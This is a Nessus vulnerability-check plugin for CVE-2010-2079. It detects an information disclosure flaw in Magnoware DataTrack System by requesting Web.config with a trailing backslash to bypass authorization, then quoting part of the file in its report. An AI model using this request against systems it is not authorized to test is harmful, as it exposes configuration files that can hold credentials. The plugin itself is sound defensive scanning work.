#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(46866);
 script_version("$Revision: 1.6 $");
 script_cvs_date("$Date: 2016/12/06 20:03:50 $");

 script_cve_id("CVE-2010-2079");
 script_osvdb_id(64933);

 script_name(english:"Magnoware DataTrack System Information Disclosure");
 script_summary(english:"Attempts to retrieve Web.config with a backslash");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts an application that is affected by an
information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The installed version of Magnoware DataTrack System is affected by an
information disclosure vulnerability.  By appending a backslash ('\\')
to a web request, it is possible for an attacker to view pages that
require authorization.

Although Nessus has not checked for them, the installed version is
also likely to be affected by several other vulnerabilities, including
cross-site scripting and directory disclosure." );

 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d7656775");
 script_set_attribute(attribute:"see_also", value:"http://packetstormsecurity.org/1005-exploits/datatrackserver35-xss.txt" );
 script_set_attribute(attribute:"solution", value:"Unknown at this time.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_set_attribute(attribute:"vuln_publication_date", value:"2010/05/17");
 script_set_attribute(attribute:"plugin_publication_date", value:"2010/06/11");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");

 script_copyright(english:"This is script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

 script_require_ports("Services/www", 80);
 script_require_keys("www/ASP", "www/magnoware", "www/datatrack_system");
 script_dependencies("datatrack_system_detect.nasl");
 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80,asp:TRUE);

install = get_install_from_kb(appname:'datatrack_system', port:port, exit_on_fail:TRUE);
url = install['dir'] + "/Web.config" + '\\';

file = '';
info = '';
# First exploit the issue...
res = http_send_recv3(port:port, method: "GET", item:url, exit_on_fail:TRUE, follow_redirect:TRUE);
if (
  '<configuration>' >< res[2] &&
  '<system.web>' >< res[2]    &&
  '<compilation defaultLanguage' >< res[2]
)
{
  file = res[2];

  # Check if we can access the page without backslash
  if(report_paranoia < 2)
  {
    res = http_send_recv3(port:port, method: "GET", item:install['dir'] + "/Web.config",exit_on_fail:TRUE);
    if (
      '<configuration>' >< res[2] &&
      '<system.web>' >< res[2]    &&
      '<compilation defaultLanguage' >< res[2]
    )
    exit(0, "Access to the DataTrack System Web.config on port "+ port + " is not restricted.");
  }

  if (report_verbosity > 0)
  {
    report = '\n' +
      'Nessus was able exploit this issue using the following URL : \n' +
      '\n' +
      build_url(port:port, qs:url) + '\n';

    if (report_verbosity > 1)
    {
      count = 0;
      foreach line (split(file))
      {
        info += line;
        count++;
        if(count >= 25)
        {
          info += '...';
          break;
        }
      }

      report += '\n' +
        '\n' +
        'Here are the contents of the file (limited to 25 lines) :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        info +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
    }
    security_warning(port:port,extra:report);
  }
  else security_warning(port);
  exit(0);
}
else
  exit(0,"The DataTrack System install at "+ build_url(port:port, qs:url) + " is not affected.");
